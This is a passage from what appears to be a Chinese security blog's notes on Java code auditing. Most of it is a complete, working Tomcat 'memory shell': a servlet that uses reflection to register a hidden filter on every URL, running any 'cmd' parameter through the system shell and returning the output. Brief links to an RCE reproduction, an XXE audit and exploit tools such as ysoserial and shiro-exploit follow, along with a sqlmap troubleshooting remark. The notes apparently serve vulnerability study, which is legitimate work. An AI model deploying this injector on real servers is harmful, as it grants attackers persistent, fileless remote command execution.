org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddTomcatFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;RoboTerh&quot;</span>;<br>            <span class="hljs-comment">//从request中获取ServletContext</span><br>            <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> req.getSession().getServletContext();<br><br>            <span class="hljs-comment">//从context中获取ApplicationContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>            <span class="hljs-comment">//从ApplicationContext中获取StandardContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>            <span class="hljs-comment">//从StandardContext中获得filterConfigs这个map对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>            <span class="hljs-comment">//如果这个过滤器名字没有注册过</span><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//自定义一个Filter对象</span><br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                            String[] commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">charsetName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>                            &#125;<br>                            commands[<span class="hljs-number">2</span>] = cmd;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<br>                                e.printStackTrace();<br>                            &#125;<br><br>                        &#125;<br>                        filterChain.doFilter(servletRequest, servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>                    &#125;<br><br>                &#125;;<br><br>                <span class="hljs-comment">//创建FilterDef对象 并添加 filter对象，filtername, filter类</span><br>                <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>                filterDef.setFilter(filter);<br>                filterDef.setFilterName(name);<br>                filterDef.setFilterClass(filter.getClass().getName());<br>                <span class="hljs-comment">//通过addFilterDef方法添加 filterDef 方法</span><br>                standardContext.addFilterDef(filterDef);<br><br>                <span class="hljs-comment">//创建FilterMap对象，并添加 filter映射，filtername</span><br>                <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>                filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>                filterMap.setFilterName(name);<br>                <span class="hljs-comment">//这个不要忘记了</span><br>                filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>                <span class="hljs-comment">//通过addFilterMapBefore方法添加filterMap对象</span><br>                standardContext.addFilterMapBefore(filterMap);<br><br>                <span class="hljs-comment">//通过前面获取的filtermaps的put方法放入filterConfig</span><br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>                filterConfigs.put(name, filterConfig);<br><br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="tomcat中间件漏洞"><a href="#tomcat中间件漏洞" class="headerlink" title="tomcat中间件漏洞"></a>tomcat中间件漏洞</h3><ul><li><p>最新RCE漏洞</p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCE复现 - FreeBuf网络安全行业门户</a></p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><a href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">记一次开源cms的Java代审 (qq.com)</a></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>Beynd Compare：文件对比工具，对比两个文件找到不同版本代码的差别</li><li>jndi注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</li><li>shiro反序列化工具：<a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></li><li>反序列化工具：ysoserial   <a href="https://blog.csdn.net/st3pby/article/details/135111050">Java反序列化工具ysoserial使用-CSDN博客</a></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>使用sqlmap时经常无法测出注入点</p></li><li><p>尝试网上方法修改源代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/%E6%B3%A8%E5%85%A5%E7%82%B9.png"></p><p>发现此代码是控制404的响应结果的，注释掉会让sqlmap强行检测注入点</p></li><li><p>问题未解决，依旧无法测出注入点</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
